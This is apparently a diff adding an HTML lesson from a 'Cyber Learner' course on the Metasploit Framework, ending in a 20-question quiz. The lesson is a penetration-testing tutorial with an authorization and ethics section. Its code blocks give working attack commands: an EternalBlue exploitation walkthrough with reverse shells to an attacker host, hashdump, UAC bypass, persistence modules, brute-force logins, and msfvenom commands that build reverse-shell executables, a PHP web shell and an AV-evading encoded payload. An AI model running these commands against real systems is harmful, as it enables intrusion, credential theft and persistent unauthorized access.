@@ -1,0 +1,846 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Metasploit Framework - Cyber Learner</title>
+    <link rel="stylesheet" href="course-styles.css">
+    <link rel="stylesheet" href="course-11.css">
+</head>
+<body>
+    <div class="course-container">
+        <header class="course-header">
+            <div class="nav-controls">
+                <a href="index.html" class="back-btn">← Back to Courses</a>
+                <div class="course-progress">
+                    <span class="course-number">Course 11</span>
+                    <span class="course-total">of 14</span>
+                </div>
+            </div>
+            <h1 class="course-title">Metasploit Framework</h1>
+            <p class="course-subtitle">Master the world's most popular penetration testing framework</p>
+        </header>
+
+        <main class="course-content">
+            <section class="content-section">
+                <h2>Introduction to Metasploit</h2>
+                <p>Metasploit is the world's most popular penetration testing framework. It provides a comprehensive platform for developing, testing, and executing exploit code against remote targets.</p>
+                
+                <h3>What is Metasploit?</h3>
+                <ul>
+                    <li><strong>Exploitation Framework:</strong> Automated exploit development and execution</li>
+                    <li><strong>Payload Generation:</strong> Create custom payloads for various platforms</li>
+                    <li><strong>Post-Exploitation:</strong> Maintain access and gather information</li>
+                    <li><strong>Vulnerability Assessment:</strong> Identify and validate security weaknesses</li>
+                    <li><strong>Social Engineering:</strong> Phishing and client-side attacks</li>
+                </ul>
+
+                <h3>Metasploit Editions</h3>
+                <div class="data-types-grid">
+                    <div class="data-type community">
+                        <h4>Community Edition</h4>
+                        <ul>
+                            <li>Free and open source</li>
+                            <li>Command-line interface</li>
+                            <li>Basic exploitation features</li>
+                            <li>Limited payload options</li>
+                        </ul>
+                    </div>
+                    <div class="data-type pro">
+                        <h4>Pro Edition</h4>
+                        <ul>
+                            <li>Commercial version</li>
+                            <li>Web-based interface</li>
+                            <li>Advanced reporting</li>
+                            <li>Team collaboration</li>
+                        </ul>
+                    </div>
+                    <div class="data-type express">
+                        <h4>Express Edition</h4>
+                        <ul>
+                            <li>Entry-level commercial</li>
+                            <li>Limited to 10 IPs</li>
+                            <li>Basic web interface</li>
+                            <li>Standard reporting</li>
+                        </ul>
+                    </div>
+                </div>
+            </section>
+
+            <section class="content-section">
+                <h2>Metasploit Architecture</h2>
+                <p>Understanding the modular architecture of Metasploit is crucial for effective usage.</p>
+                
+                <div class="code-block">
+                    <pre><code># Metasploit Directory Structure:
+/usr/share/metasploit-framework/
+├── modules/
+│   ├── exploits/          # Exploit modules
+│   ├── payloads/          # Payload modules
+│   ├── auxiliary/         # Auxiliary modules
+│   ├── post/              # Post-exploitation modules
+│   ├── encoders/          # Encoder modules
+│   └── nops/              # NOP generators
+├── data/                  # Data files and wordlists
+├── tools/                 # Standalone tools
+├── scripts/               # Meterpreter scripts
+└── plugins/               # Framework plugins
+
+# Module Types:
+Exploits    - Code that takes advantage of vulnerabilities
+Payloads    - Code that runs after successful exploitation
+Auxiliary   - Scanning, fuzzing, and DoS modules
+Post        - Post-exploitation modules
+Encoders    - Encode payloads to avoid detection
+NOPs        - No-operation code generators</code></pre>
+                </div>
+
+                <h3>Core Components</h3>
+                <ul>
+                    <li><strong>MSF Console (msfconsole):</strong> Primary interface</li>
+                    <li><strong>MSF CLI (msfcli):</strong> Command-line interface</li>
+                    <li><strong>MSF Web:</strong> Web-based interface</li>
+                    <li><strong>Armitage:</strong> Graphical cyber attack management tool</li>
+                    <li><strong>Cobalt Strike:</strong> Advanced threat emulation platform</li>
+                </ul>
+            </section>
+
+            <section class="content-section">
+                <h2>Getting Started with MSFconsole</h2>
+                <p>MSFconsole is the primary interface for interacting with the Metasploit Framework.</p>
+                
+                <div class="code-block">
+                    <pre><code># Starting Metasploit:
+sudo msfconsole
+
+# Basic Commands:
+help                    # Show help menu
+version                 # Show version information
+exit                    # Exit Metasploit
+quit                    # Same as exit
+
+# Database Commands:
+db_status              # Check database connection
+db_rebuild_cache       # Rebuild module cache
+workspace              # List workspaces
+workspace -a test      # Add new workspace
+workspace test         # Switch to workspace
+
+# Search Commands:
+search type:exploit platform:windows
+search cve:2017-0144   # Search by CVE
+search ms17-010        # Search by MS bulletin
+search apache          # Search by service name
+
+# Module Information:
+info                   # Show module information
+show options           # Show module options
+show payloads          # Show compatible payloads
+show targets           # Show available targets</code></pre>
+                </div>
+
+                <h3>Basic Workflow</h3>
+                <ol>
+                    <li><strong>Search:</strong> Find appropriate exploit modules</li>
+                    <li><strong>Use:</strong> Select and load the exploit module</li>
+                    <li><strong>Configure:</strong> Set required options (RHOSTS, LHOST, etc.)</li>
+                    <li><strong>Payload:</strong> Select and configure payload</li>
+                    <li><strong>Exploit:</strong> Execute the exploit</li>
+                    <li><strong>Post-Exploitation:</strong> Maintain access and gather information</li>
+                </ol>
+            </section>
+
+            <section class="content-section">
+                <h2>Exploit Modules</h2>
+                <p>Exploit modules contain the actual exploit code that takes advantage of specific vulnerabilities.</p>
+                
+                <div class="code-block">
+                    <pre><code># Using Exploit Modules:
+
+# Select an exploit:
+use exploit/windows/smb/ms17_010_eternalblue
+
+# Show exploit information:
+info
+
+# Show required options:
+show options
+
+# Set target host:
+set RHOSTS 192.168.1.100
+
+# Set payload:
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+
+# Set local host (for reverse connections):
+set LHOST 192.168.1.10
+
+# Set local port:
+set LPORT 4444
+
+# Check if target is vulnerable:
+check
+
+# Execute the exploit:
+exploit
+# or
+run
+
+# Background the session:
+background
+
+# List active sessions:
+sessions -l
+
+# Interact with session:
+sessions -i 1</code></pre>
+                </div>
+
+                <h3>Popular Exploit Categories</h3>
+                <div class="data-types-grid">
+                    <div class="data-type windows-exploits">
+                        <h4>Windows Exploits</h4>
+                        <ul>
+                            <li>ms17_010_eternalblue</li>
+                            <li>ms08_067_netapi</li>
+                            <li>ms17_010_psexec</li>
+                            <li>ms14_058_track_popup_menu</li>
+                        </ul>
+                    </div>
+                    <div class="data-type linux-exploits">
+                        <h4>Linux Exploits</h4>
+                        <ul>
+                            <li>unix/webapp/drupal_drupalgeddon2</li>
+                            <li>linux/local/dirty_cow</li>
+                            <li>unix/ftp/vsftpd_234_backdoor</li>
+                            <li>linux/samba/is_known_pipename</li>
+                        </ul>
+                    </div>
+                    <div class="data-type web-exploits">
+                        <h4>Web Application Exploits</h4>
+                        <ul>
+                            <li>unix/webapp/php_cgi_arg_injection</li>
+                            <li>multi/http/struts2_content_type_ognl</li>
+                            <li>unix/webapp/joomla_comfields_sqli_rce</li>
+                            <li>multi/http/apache_struts2_rest_xstream</li>
+                        </ul>
+                    </div>
+                </div>
+            </section>
+
+            <section class="content-section">
+                <h2>Payload Types</h2>
+                <p>Payloads are the code that runs after successful exploitation. Different payload types serve different purposes.</p>
+                
+                <div class="code-block">
+                    <pre><code># Payload Categories:
+
+# Singles (Standalone):
+windows/shell_reverse_tcp          # Simple command shell
+linux/x86/shell_reverse_tcp        # Linux command shell
+windows/x64/exec                   # Execute command
+
+# Stagers (Small initial payload):
+windows/meterpreter/reverse_tcp     # Meterpreter stager
+linux/x86/meterpreter/reverse_tcp  # Linux Meterpreter stager
+
+# Stages (Full-featured payload):
+windows/meterpreter                 # Full Meterpreter
+linux/x86/meterpreter              # Linux Meterpreter
+
+# Common Payload Options:
+LHOST    # Local host (attacker IP)
+LPORT    # Local port (listening port)
+RHOST    # Remote host (target IP)
+RPORT    # Remote port (target port)
+
+# Payload Selection:
+show payloads                       # Show compatible payloads
+set PAYLOAD windows/meterpreter/reverse_tcp
+show options                        # Show payload options</code></pre>
+                </div>
+
+                <h3>Meterpreter</h3>
+                <p>Meterpreter is Metasploit's advanced payload that provides a powerful post-exploitation platform.</p>
+                
+                <div class="code-block">
+                    <pre><code># Meterpreter Features:
+- In-memory execution (no files on disk)
+- Encrypted communication
+- Extensible through modules
+- Cross-platform support
+- Advanced post-exploitation capabilities
+
+# Basic Meterpreter Commands:
+help                    # Show help menu
+sysinfo                 # System information
+getuid                  # Current user
+ps                      # Process list
+pwd                     # Current directory
+ls                      # List files
+cd                      # Change directory
+download file.txt       # Download file
+upload file.txt         # Upload file
+shell                   # Drop to system shell
+background              # Background session
+exit                    # Exit Meterpreter</code></pre>
+                </div>
+            </section>
+
+            <section class="content-section">
+                <h2>Auxiliary Modules</h2>
+                <p>Auxiliary modules perform supporting functions like scanning, fuzzing, and denial of service attacks.</p>
+                
+                <div class="code-block">
+                    <pre><code># Scanner Modules:
+use auxiliary/scanner/portscan/tcp
+set RHOSTS 192.168.1.0/24
+set PORTS 21,22,23,25,53,80,110,443,993,995
+run
+
+# SMB Scanner:
+use auxiliary/scanner/smb/smb_version
+set RHOSTS 192.168.1.0/24
+run
+
+# HTTP Scanner:
+use auxiliary/scanner/http/http_version
+set RHOSTS 192.168.1.0/24
+run
+
+# SSH Scanner:
+use auxiliary/scanner/ssh/ssh_version
+set RHOSTS 192.168.1.0/24
+run
+
+# Brute Force Modules:
+use auxiliary/scanner/ssh/ssh_login
+set RHOSTS 192.168.1.100
+set USER_FILE users.txt
+set PASS_FILE passwords.txt
+run
+
+# FTP Brute Force:
+use auxiliary/scanner/ftp/ftp_login
+set RHOSTS 192.168.1.100
+set USERNAME admin
+set PASS_FILE passwords.txt
+run</code></pre>
+                </div>
+
+                <h3>Popular Auxiliary Categories</h3>
+                <ul>
+                    <li><strong>Scanners:</strong> Port scanning, service detection, vulnerability scanning</li>
+                    <li><strong>Fuzzers:</strong> Input fuzzing for vulnerability discovery</li>
+                    <li><strong>DoS:</strong> Denial of service attacks</li>
+                    <li><strong>Spoof:</strong> ARP spoofing, DNS spoofing</li>
+                    <li><strong>Gather:</strong> Information gathering modules</li>
+                </ul>
+            </section>
+
+            <section class="content-section">
+                <h2>Post-Exploitation Modules</h2>
+                <p>Post-exploitation modules help maintain access and gather information after successful compromise.</p>
+                
+                <div class="code-block">
+                    <pre><code># Post-Exploitation Workflow:
+1. Gain initial access
+2. Escalate privileges
+3. Maintain persistence
+4. Gather information
+5. Pivot to other systems
+6. Cover tracks
+
+# Common Post Modules:
+use post/windows/gather/hashdump      # Dump password hashes
+use post/windows/gather/enum_shares   # Enumerate shares
+use post/windows/gather/enum_applications  # Installed applications
+use post/windows/gather/credentials/windows_autologin  # Auto-login creds
+use post/multi/gather/env             # Environment variables
+
+# Running Post Modules:
+sessions -l                           # List sessions
+use post/windows/gather/hashdump
+set SESSION 1                         # Set target session
+run
+
+# Privilege Escalation:
+use exploit/windows/local/bypassuac_eventvwr
+set SESSION 1
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.1.10
+set LPORT 4445
+run</code></pre>
+                </div>
+
+                <h3>Information Gathering</h3>
+                <div class="data-types-grid">
+                    <div class="data-type system-info">
+                        <h4>System Information</h4>
+                        <ul>
+                            <li>Operating system details</li>
+                            <li>Hardware information</li>
+                            <li>Network configuration</li>
+                            <li>Installed software</li>
+                        </ul>
+                    </div>
+                    <div class="data-type credentials">
+                        <h4>Credentials</h4>
+                        <ul>
+                            <li>Password hashes</li>
+                            <li>Cached credentials</li>
+                            <li>Browser passwords</li>
+                            <li>Application passwords</li>
+                        </ul>
+                    </div>
+                    <div class="data-type network-info">
+                        <h4>Network Information</h4>
+                        <ul>
+                            <li>Network shares</li>
+                            <li>Active connections</li>
+                            <li>Routing tables</li>
+                            <li>ARP tables</li>
+                        </ul>
+                    </div>
+                </div>
+            </section>
+
+            <section class="content-section">
+                <h2>Meterpreter Advanced Features</h2>
+                <p>Meterpreter provides advanced capabilities for post-exploitation activities.</p>
+                
+                <div class="code-block">
+                    <pre><code># Process Management:
+ps                          # List processes
+migrate 1234                # Migrate to process ID 1234
+kill 1234                   # Kill process ID 1234
+execute -f notepad.exe      # Execute program
+
+# File System Operations:
+pwd                         # Current directory
+ls                          # List files
+cd C:\\Windows              # Change directory
+cat file.txt                # Display file contents
+edit file.txt               # Edit file
+rm file.txt                 # Delete file
+mkdir newdir                # Create directory
+
+# Network Operations:
+ipconfig                    # Network configuration
+route                       # Routing table
+arp                         # ARP table
+netstat                     # Network connections
+portfwd add -l 3389 -p 3389 -r 192.168.1.100  # Port forwarding
+
+# System Operations:
+sysinfo                     # System information
+getuid                      # Current user
+getpid                      # Current process ID
+getsystem                   # Attempt privilege escalation
+hashdump                    # Dump password hashes
+screenshot                  # Take screenshot
+webcam_snap                 # Take webcam photo</code></pre>
+                </div>
+
+                <h3>Persistence Mechanisms</h3>
+                <div class="code-block">
+                    <pre><code># Persistence Options:
+run persistence -X -i 10 -p 4444 -r 192.168.1.10
+# -X = startup
+# -i = interval (seconds)
+# -p = port
+# -r = IP address
+
+# Service Persistence:
+use exploit/windows/local/persistence_service
+set SESSION 1
+set PAYLOAD windows/meterpreter/reverse_tcp
+run
+
+# Registry Persistence:
+use exploit/windows/local/registry_persistence
+set SESSION 1
+run
+
+# Scheduled Task Persistence:
+use exploit/windows/local/s4u_persistence
+set SESSION 1
+run</code></pre>
+                </div>
+            </section>
+
+            <section class="content-section">
+                <h2>Payload Generation with MSFvenom</h2>
+                <p>MSFvenom is a standalone payload generator that replaced msfpayload and msfencode.</p>
+                
+                <div class="code-block">
+                    <pre><code># MSFvenom Syntax:
+msfvenom -p [payload] [options] -f [format] -o [output]
+
+# List Payloads:
+msfvenom --list payloads
+
+# List Formats:
+msfvenom --list formats
+
+# List Encoders:
+msfvenom --list encoders
+
+# Windows Reverse Shell:
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o shell.exe
+
+# Linux Reverse Shell:
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f elf -o shell
+
+# PHP Web Shell:
+msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f raw -o shell.php
+
+# Android APK:
+msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -o malicious.apk
+
+# Encoded Payload:
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -e x86/shikata_ga_nai -i 3 -f exe -o encoded.exe</code></pre>
+                </div>
+
+                <h3>Common Output Formats</h3>
+                <ul>
+                    <li><strong>exe:</strong> Windows executable</li>
+                    <li><strong>elf:</strong> Linux executable</li>
+                    <li><strong>raw:</strong> Raw shellcode</li>
+                    <li><strong>c:</strong> C language format</li>
+                    <li><strong>python:</strong> Python script</li>
+                    <li><strong>powershell:</strong> PowerShell script</li>
+                </ul>
+            </section>
+
+            <section class="content-section">
+                <h2>Practical Exploitation Example</h2>
+                <p>Step-by-step example of exploiting a vulnerable Windows system.</p>
+                
+                <div class="code-block">
+                    <pre><code># Step 1: Start Metasploit
+sudo msfconsole
+
+# Step 2: Search for exploit
+search ms17-010
+
+# Step 3: Use exploit
+use exploit/windows/smb/ms17_010_eternalblue
+
+# Step 4: Show options
+show options
+
+# Step 5: Set target
+set RHOSTS 192.168.1.100
+
+# Step 6: Set payload
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+
+# Step 7: Set local host
+set LHOST 192.168.1.10
+
+# Step 8: Check if vulnerable
+check
+
+# Step 9: Exploit
+exploit
+
+# Step 10: Interact with Meterpreter
+sysinfo
+getuid
+hashdump
+
+# Step 11: Post-exploitation
+use post/windows/gather/enum_shares
+set SESSION 1
+run
+
+# Step 12: Maintain persistence
+run persistence -X -i 10 -p 4445 -r 192.168.1.10</code></pre>
+                </div>
+            </section>
+
+            <section class="content-section">
+                <h2>Best Practices and Ethics</h2>
+                
+                <h3>Legal and Ethical Considerations</h3>
+                <ul>
+                    <li><strong>Authorization:</strong> Only test systems you own or have explicit permission to test</li>
+                    <li><strong>Scope:</strong> Stay within the defined scope of testing</li>
+                    <li><strong>Documentation:</strong> Keep detailed records of all activities</li>
+                    <li><strong>Responsible Disclosure:</strong> Report vulnerabilities appropriately</li>
+                    <li><strong>Data Protection:</strong> Protect any sensitive data encountered</li>
+                </ul>
+
+                <h3>Technical Best Practices</h3>
+                <ul>
+                    <li><strong>Lab Environment:</strong> Practice in isolated lab environments</li>
+                    <li><strong>Backup Plans:</strong> Have rollback procedures ready</li>
+                    <li><strong>Stealth:</strong> Use appropriate techniques to avoid detection</li>
+                    <li><strong>Cleanup:</strong> Remove artifacts after testing</li>
+                    <li><strong>Updates:</strong> Keep Metasploit updated with latest modules</li>
+                </ul>
+
+                <h3>Common Mistakes to Avoid</h3>
+                <ul>
+                    <li><strong>Wrong Payload:</strong> Using incompatible payload architectures</li>
+                    <li><strong>Firewall Issues:</strong> Not considering firewall restrictions</li>
+                    <li><strong>Session Management:</strong> Losing track of active sessions</li>
+                    <li><strong>Privilege Context:</strong> Not understanding current privilege level</li>
+                    <li><strong>Network Pivoting:</strong> Improper network routing configuration</li>
+                </ul>
+            </section>
+
+            <section class="video-section">
+                <h2>📺 Video Tutorial</h2>
+                <div class="video-container">
+                    <div class="video-placeholder">
+                        <div class="video-icon">🎥</div>
+                        <p>YouTube video will be embedded here</p>
+                        <small>Video placeholder - Link to be added</small>
+                    </div>
+                </div>
+            </section>
+
+            <section class="test-section">
+                <h2>📝 Knowledge Test</h2>
+                <p class="test-instruction">Complete this test to unlock the next course. You need 18 out of 20 correct answers to pass.</p>
+                
+                <div class="test-container">
+                    <div class="question" data-question="1">
+                        <h3>Question 1</h3>
+                        <p>What is the primary interface for interacting with Metasploit?</p>
+                        <div class="options">
+                            <label><input type="radio" name="q1" value="a"> msfconsole</label>
+                            <label><input type="radio" name="q1" value="b"> msfcli</label>
+                            <label><input type="radio" name="q1" value="c"> msfweb</label>
+                            <label><input type="radio" name="q1" value="d"> armitage</label>
+                        </div>
+                    </div>
+
+                    <div class="question" data-question="2">
+                        <h3>Question 2</h3>
+                        <p>Which module type contains the actual exploit code?</p>
+                        <div class="options">
+                            <label><input type="radio" name="q2" value="a"> Auxiliary</label>
+                            <label><input type="radio" name="q2" value="b"> Payload</label>
+                            <label><input type="radio" name="q2" value="c"> Exploit</label>
+                            <label><input type="radio" name="q2" value="d"> Post</label>
+                        </div>
+                    </div>
+
+                    <div class="question" data-question="3">
+                        <h3>Question 3</h3>
+                        <p>What is Meterpreter?</p>
+                        <div class="options">
+                            <label><input type="radio" name="q3" value="a"> A vulnerability scanner</label>
+                            <label><input type="radio" name="q3" value="b"> An advanced payload</label>
+                            <label><input type="radio" name="q3" value="c"> A network mapper</label>
+                            <label><input type="radio" name="q3" value="d"> A password cracker</label>
+                        </div>
+                    </div>
+
+                    <div class="question" data-question="4">
+                        <h3>Question 4</h3>
+                        <p>Which command is used to select an exploit module?</p>
+                        <div class="options">
+                            <label><input type="radio" name="q4" value="a"> select</label>
+                            <label><input type="radio" name="q4" value="b"> use</label>
+                            <label><input type="radio" name="q4" value="c"> load</label>
+                            <label><input type="radio" name="q4" value="d"> run</label>
+                        </div>
+                    </div>
+
+                    <div class="question" data-question="5">
+                        <h3>Question 5</h3>
+                        <p>What does LHOST represent in Metasploit?</p>
+                        <div class="options">
+                            <label><input type="radio" name="q5" value="a"> Target host IP</label>
+                            <label><input type="radio" name="q5" value="b"> Local host IP (attacker)</label>
+                            <label><input type="radio" name="q5" value="c"> Listening host</label>
+                            <label><input type="radio" name="q5" value="d"> Last host contacted</label>
+                        </div>
+                    </div>
+
+                    <div class="question" data-question="6">
+                        <h3>Question 6</h3>
+                        <p>Which tool replaced msfpayload and msfencode?</p>
+                        <div class="options">
+                            <label><input type="radio" name="q6" value="a"> msfvenom</label>
+                            <label><input type="radio" name="q6" value="b"> msfconsole</label>
+                            <label><input type="radio" name="q6" value="c"> msfcli</label>
+                            <label><input type="radio" name="q6" value="d"> msfdb</label>
+                        </div>
+                    </div>
+
+                    <div class="question" data-question="7">
+                        <h3>Question 7</h3>
+                        <p>What is the purpose of auxiliary modules?</p>
+                        <div class="options">
+                            <label><input type="radio" name="q7" value="a"> Execute exploits</label>
+                            <label><input type="radio" name="q7" value="b"> Generate payloads</label>
+                            <label><input type="radio" name="q7" value="c"> Perform supporting functions like scanning</label>
+                            <label><input type="radio" name="q7" value="d"> Post-exploitation activities</label>
+                        </div>
+                    </div>
+
+                    <div class="question" data-question="8">
+                        <h3>Question 8</h3>
+                        <p>Which Meterpreter command is used to escalate privileges?</p>
+                        <div class="options">
+                            <label><input type="radio" name="q8" value="a"> getuid</label>
+                            <label><input type="radio" name="q8" value="b"> getsystem</label>
+                            <label><input type="radio" name="q8" value="c"> sysinfo</label>
+                            <label><input type="radio" name="q8" value="d"> hashdump</label>
+                        </div>
+                    </div>
+
+                    <div class="question" data-question="9">
+                        <h3>Question 9</h3>
+                        <p>What is the difference between a stager and a stage payload?</p>
+                        <div class="options">
+                            <label><input type="radio" name="q9" value="a"> No difference</label>
+                            <label><input type="radio" name="q9" value="b"> Stager is small initial payload, stage is full-featured</label>
+                            <label><input type="radio" name="q9" value="c"> Stage is small, stager is large</label>
+                            <label><input type="radio" name="q9" value="d"> They are different encoding methods</label>
+                        </div>
+                    </div>
+
+                    <div class="question" data-question="10">
+                        <h3>Question 10</h3>
+                        <p>Which command shows compatible payloads for an exploit?</p>
+                        <div class="options">
+                            <label><input type="radio" name="q10" value="a"> show options</label>
+                            <label><input type="radio" name="q10" value="b"> show payloads</label>
+                            <label><input type="radio" name="q10" value="c"> show targets</label>
+                            <label><input type="radio" name="q10" value="d"> info</label>
+                        </div>
+                    </div>
+
+                    <div class="question" data-question="11">
+                        <h3>Question 11</h3>
+                        <p>What is the purpose of the 'check' command?</p>
+                        <div class="options">
+                            <label><input type="radio" name="q11" value="a"> Check module syntax</label>
+                            <label><input type="radio" name="q11" value="b"> Check if target is vulnerable</label>
+                            <label><input type="radio" name="q11" value="c"> Check network connectivity</label>
+                            <label><input type="radio" name="q11" value="d"> Check payload compatibility</label>
+                        </div>
+                    </div>
+
+                    <div class="question" data-question="12">
+                        <h3>Question 12</h3>
+                        <p>Which Meterpreter command migrates to another process?</p>
+                        <div class="options">
+                            <label><input type="radio" name="q12" value="a"> ps</label>
+                            <label><input type="radio" name="q12" value="b"> migrate</label>
+                            <label><input type="radio" name="q12" value="c"> execute</label>
+                            <label><input type="radio" name="q12" value="d"> kill</label>
+                        </div>
+                    </div>
+
+                    <div class="question" data-question="13">
+                        <h3>Question 13</h3>
+                        <p>What does the 'sessions -l' command do?</p>
+                        <div class="options">
+                            <label><input type="radio" name="q13" value="a"> List available exploits</label>
+                            <label><input type="radio" name="q13" value="b"> List active sessions</label>
+                            <label><input type="radio" name="q13" value="c"> List payloads</label>
+                            <label><input type="radio" name="q13" value="d"> List listeners</label>
+                        </div>
+                    </div>
+
+                    <div class="question" data-question="14">
+                        <h3>Question 14</h3>
+                        <p>Which module category is used for post-exploitation activities?</p>
+                        <div class="options">
+                            <label><input type="radio" name="q14" value="a"> Exploit</label>
+                            <label><input type="radio" name="q14" value="b"> Auxiliary</label>
+                            <label><input type="radio" name="q14" value="c"> Post</label>
+                            <label><input type="radio" name="q14" value="d"> Payload</label>
+                        </div>
+                    </div>
+
+                    <div class="question" data-question="15">
+                        <h3>Question 15</h3>
+                        <p>What is the purpose of encoders in Metasploit?</p>
+                        <div class="options">
+                            <label><input type="radio" name="q15" value="a"> Compress payloads</label>
+                            <label><input type="radio" name="q15" value="b"> Encrypt communications</label>
+                            <label><input type="radio" name="q15" value="c"> Avoid antivirus detection</label>
+                            <label><input type="radio" name="q15" value="d"> Speed up exploits</label>
+                        </div>
+                    </div>
+
+                    <div class="question" data-question="16">
+                        <h3>Question 16</h3>
+                        <p>Which famous exploit targets the SMB vulnerability MS17-010?</p>
+                        <div class="options">
+                            <label><input type="radio" name="q16" value="a"> EternalBlue</label>
+                            <label><input type="radio" name="q16" value="b"> BlueKeep</label>
+                            <label><input type="radio" name="q16" value="c"> Conficker</label>
+                            <label><input type="radio" name="q16" value="d"> Stuxnet</label>
+                        </div>
+                    </div>
+
+                    <div class="question" data-question="17">
+                        <h3>Question 17</h3>
+                        <p>What should you always have before using Metasploit on a system?</p>
+                        <div class="options">
+                            <label><input type="radio" name="q17" value="a"> Root access</label>
+                            <label><input type="radio" name="q17" value="b"> Written authorization</label>
+                            <label><input type="radio" name="q17" value="c"> Network access</label>
+                            <label><input type="radio" name="q17" value="d"> Antivirus disabled</label>
+                        </div>
+                    </div>
+
+                    <div class="question" data-question="18">
+                        <h3>Question 18</h3>
+                        <p>Which Meterpreter command takes a screenshot?</p>
+                        <div class="options">
+                            <label><input type="radio" name="q18" value="a"> capture</label>
+                            <label><input type="radio" name="q18" value="b"> screenshot</label>
+                            <label><input type="radio" name="q18" value="c"> snap</label>
+                            <label><input type="radio" name="q18" value="d"> image</label>
+                        </div>
+                    </div>
+
+                    <div class="question" data-question="19">
+                        <h3>Question 19</h3>
+                        <p>What is the purpose of the 'background' command in Meterpreter?</p>
+                        <div class="options">
+                            <label><input type="radio" name="q19" value="a"> Hide the process</label>
+                            <label><input type="radio" name="q19" value="b"> Background the session</label>
+                            <label><input type="radio" name="q19" value="c"> Run in background mode</label>
+                            <label><input type="radio" name="q19" value="d"> Change process priority</label>
+                        </div>
+                    </div>
+
+                    <div class="question" data-question="20">
+                        <h3>Question 20</h3>
+                        <p>Which format is used to generate a Windows executable with msfvenom?</p>
+                        <div class="options">
+                            <label><input type="radio" name="q20" value="a"> -f elf</label>
+                            <label><input type="radio" name="q20" value="b"> -f exe</label>
+                            <label><input type="radio" name="q20" value="c"> -f raw</label>
+                            <label><input type="radio" name="q20" value="d"> -f bin</label>
+                        </div>
+                    </div>
+
+                    <div class="test-actions">
+                        <button class="submit-test-btn">Submit Test</button>
+                        <div class="test-result" style="display: none;">
+                            <div class="score-display"></div>
+                            <div class="result-message"></div>
+                            <button class="next-course-btn" style="display: none;">Proceed to Next Course</button>
+                            <button class="retry-btn" style="display: none;">Retry Test</button>
+                        </div>
+                    </div>
+                </div>
+            </section>
+        </main>
+    </div>
+
+    <script src="course-11.js"></script>
+</body>
+</html>
